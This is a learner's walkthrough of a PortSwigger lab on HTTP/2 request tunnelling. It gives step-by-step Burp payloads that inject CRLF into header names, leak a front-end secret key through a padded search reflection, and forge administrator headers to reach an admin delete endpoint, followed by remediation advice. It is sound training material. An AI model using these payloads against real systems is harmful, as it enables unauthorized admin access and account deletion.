# Lab 17: Bypassing access controls via HTTP/2 request tunnelling

**Category:** HTTP Request Smuggling
**Difficulty:** Expert
**Lab link:** [Bypassing access controls via HTTP/2 request tunnelling](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling)

## Overview

The front-end doesn't reuse back-end connections, so classic smuggling (poisoning the pool for other users) doesn't work here. **Request tunnelling** works even without connection reuse: the smuggled request is nested inside your own body, and the back-end's response to it comes back inside your response body. You read it directly — no victim required.

Access control: `/admin` requires `X-SSL-CLIENT-CN: administrator` plus `X-SSL-VERIFIED: 1` plus a secret `X-FRONTEND-KEY`. The front-end adds those headers based on client cert. First we leak the per-instance `X-FRONTEND-KEY` via a padded search reflection; then we forge all three on a tunnelled `/admin/delete?username=carlos` request.

## Key Concepts

- **Tunnelling vs smuggling:** tunnelling nests a request in the attacker's own body; the response comes back in the attacker's own response body. No cross-user impact, but works even when the front-end doesn't reuse back-end connections.
- **CRLF injection in header NAME (not value):** many front-ends validate header values but not names. Injecting CRLF into the Name field (via Burp Inspector Shift+Enter) smuggles arbitrary HTTP/1 content.
- **Oversized smuggled Content-Length + padded body** = reflected-headers leak primitive. Front-end-added headers appear in the response as reflected search content.
- **`HEAD` method or small inner target** keeps the tunnelled response small enough to fit within the attacker's outer response body.

## Burp Setup

- Repeater → Inspector → **HTTP/2**.
- Repeater menu → uncheck **Update Content-Length**.

## Direct Steps

### Step 1 — Confirm CRLF-in-header-name works

In Inspector, add a header:
- Name: `foo: bar` + **Shift+Enter** + ` Host: abc`
- Value: `xyz`

Send. An error reflecting `abc` as a Host confirms injection.

### Step 2 — Find the search reflection

Browse to `/?search=hello`. Send to Repeater, upgrade to HTTP/2. Confirm `hello` reflected in response.

### Step 3 — Switch to POST

Change method to `POST`, move `search=hello` to body.

### Step 4 — Smuggle a Content-Length to cut body short

Inspector → add header:
- Name: `foo: bar` + Shift+Enter + ` Content-Length: 500` + Shift+Enter + ` ` + Shift+Enter + ` search=x`
- Value: `xyz`

Pad the outer body with A's until it exceeds 500 bytes: `search=xAAAAA...` (~500+ chars).

### Step 5 — Leak the client-auth headers

Send. Response's reflected search output shows the front-end's appended headers:

```
X-SSL-VERIFIED: 1
X-SSL-CLIENT-CN: wiener
X-FRONTEND-KEY: abc-your-unique-key-xyz
Cookie: session=...
```

**Copy the `X-FRONTEND-KEY` value.**

### Step 6 — Tunnel a GET /admin with forged headers

Change method to `HEAD` (minimizes response).

Set header Name to:
```
foo: bar\r\n \r\n GET /admin HTTP/1.1\r\n X-SSL-VERIFIED: 1\r\n X-SSL-CLIENT-CN: administrator\r\n X-FRONTEND-KEY: YOUR-LEAKED-KEY\r\n \r\n
```

(Build via Shift+Enter in Inspector.)

### Step 7 — If "not enough bytes" error, test with /login first

Change `GET /admin` → `GET /login` to confirm tunnelling works with a smaller response.

### Step 8 — Delete carlos

Change tunnelled path to `/admin/delete?username=carlos`. Send. May show an error — but carlos is deleted → lab solved.

## Why Tunnelling Works Without Connection Reuse

Classic smuggling needs the back-end connection to carry over to another user. Tunnelling doesn't — the smuggled request is parsed and processed within your own request-response pair. The nested HTTP/1 response bytes get included in your outer HTTP/2 response body as if they were part of the content.

Front-end limits how much of the back-end's output it reads back (via its own CL calculation). If the tunnelled response is larger than that window, you get "not enough bytes" — hence the `HEAD` or smaller-target trick.

## Why `X-SSL-CLIENT-CN: administrator` + `X-FRONTEND-KEY` Both Needed

- `X-SSL-CLIENT-CN: administrator` satisfies the back-end's auth check.
- `X-FRONTEND-KEY` is a secondary shared-secret check — without the right key, the back-end rejects even "authenticated" requests.

Both headers are added by the front-end in normal traffic; CRLF injection lets us forge them on a tunnelled request. The leak step (Step 5) is required because the key is per-lab-instance.

## Why CRLF-in-Name Instead of CRLF-in-Value

Lab 15 and 16 used CRLF injection in header values. This lab's front-end validates values but not names — a slightly different sanitizer bypass. The underlying primitive is the same: inject bytes that the back-end's HTTP/1 parser sees as HTTP/1 syntax.

## Why It Worked

- Front-end accepts HTTP/2 header **names** containing CRLF without validation.
- Front-end doesn't reuse back-end connections (classic smuggling dead) — but request tunnelling works regardless.
- Back-end trusts `X-SSL-CLIENT-CN` for authorization.
- `X-FRONTEND-KEY` is a shared-secret-style header that's attacker-leakable via reflection.

## Remediation

- **Validate HTTP/2 header NAMES at the front-end**, not just values. Reject CRLF, NUL, control characters.
- **Don't rely on front-end-added trust headers for authorization.** Use authenticated internal mTLS or signed internal tokens the back-end verifies cryptographically.
- **Mark authenticated endpoint responses as uncacheable** and ensure response pairing uses per-request tokens, not connection-FIFO.
- **Use HTTP/2 end-to-end** to eliminate the downgrade step.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/request-smuggling/lab-17-h2-request-tunnelling-access-bypass/solve.py)

Documentation-first — HPACK framing with CRLF in header names requires low-level HTTP/2 library control. Manual Burp Inspector + Shift+Enter is the clean path.

## Key Takeaways

- **Tunnelling > smuggling when connection reuse is off.** The attack class survives the most common "fix."
- **CRLF in header name is a separate bypass** from CRLF in header value — front-ends often validate one but not the other.
- **Oversized smuggled CL + padded body = header leak** via reflection.
- **Front-end-added trust headers are forgeable** via tunnelling + CRLF injection.
- **The fix is cryptographic internal auth.** Shared-secret headers are leakable; mTLS and signed tokens are not.
